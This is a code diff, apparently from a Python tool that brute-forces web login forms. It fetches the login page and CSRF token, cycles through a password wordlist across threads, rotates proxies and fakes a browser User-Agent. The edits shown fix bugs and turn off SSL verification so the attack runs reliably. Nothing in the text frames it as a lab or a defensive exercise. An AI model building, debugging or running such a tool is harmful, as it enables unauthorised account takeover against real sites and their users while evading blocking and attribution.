@@ -31,7 +31,13 @@ def get_random_proxy(proxy_list_file):
 # Function to extract the form and CSRF token from the login page
 def get_login_form_details(url):
     session = requests.Session()
-    response = session.get(url)
+    try:
+        response = session.get(url, verify=False)  # Disable SSL verification if needed
+        print(f"Status Code: {response.status_code}")
+        print(f"Response Content: {response.text[:500]}")  # Print the first 500 characters for debugging
+    except requests.exceptions.RequestException as e:
+        print(f"Failed to retrieve the login page. Error: {e}")
+        return None, None, None, None, None
 
     if response.status_code != 200:
         print("Failed to retrieve the login page.")
@@ -88,7 +94,7 @@ def attempt_login(session, action_url, method, username_field, password_field, c
 # Thread worker
 def worker(username, url, redirect_url, wordlist, headers, action_url, method, username_field, password_field, csrf_token, proxies=None, delay=0.5):
     session = requests.Session()
-    proxy_cycle = cycle(proxies) if proxies else None
+    proxy_cycle = cycle(proxies) if proxies else iter([])  # Use an empty iterator if no proxies are provided
     for password in wordlist:
         proxy = next(proxy_cycle, None)  # Get the next proxy (if proxies are used)
         success = attempt_login(session, action_url, method, username_field, password_field, csrf_token, username, password, headers, redirect_url, proxy)
@@ -119,9 +125,9 @@ def main():
         headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
 
     # Load proxies if specified
-    proxies = None
+    proxies = []
     if args.proxy_list:
-        proxies = [get_random_proxy(args.proxy_list)]
+        proxies = [get_random_proxy(args.proxy_list)]  # Load proxies as a list of one or more proxy dicts
 
     threads = []
     chunk_size = len(passwords) // args.threads
